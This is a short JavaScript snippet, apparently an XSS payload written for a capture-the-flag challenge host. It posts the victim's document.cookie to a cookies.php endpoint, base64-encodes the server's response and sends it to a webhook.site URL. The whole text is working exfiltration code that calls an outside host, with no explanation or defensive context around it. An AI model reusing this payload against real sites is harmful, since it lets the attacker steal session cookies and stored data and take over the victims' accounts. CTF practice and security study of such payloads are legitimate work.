// Fetching /index.php
fetch('http://host3.metaproblems.com:6020/index.php')
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    return response.text();
  })
  .then(indexResponse => {
    // Fetching /cookies.php
    return fetch('http://host3.metaproblems.com:6020/cookies.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `cookie_name=5&cookie_value=${encodeURIComponent(document.cookie)}&submit=Store+Cookie`
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.text();
    })
    .then(cookiesResponse => {
      // Sending cookiesResponse to the webhook
      const encodedText = btoa(cookiesResponse); // Encode the text to base64
      return fetch(`https://webhook.site/dbfb5ad3-fcf1-4c2d-ac00-c239ea0379be?cz=${encodedText}`);
    });
  })
  .then(webhookResponse => {
    if (webhookResponse.ok) {
      console.log('Webhook request successful');
    } else {
      throw new Error('Webhook request failed');
    }
  })
  .catch(error => {
    console.error('Error during fetch:', error);
  });
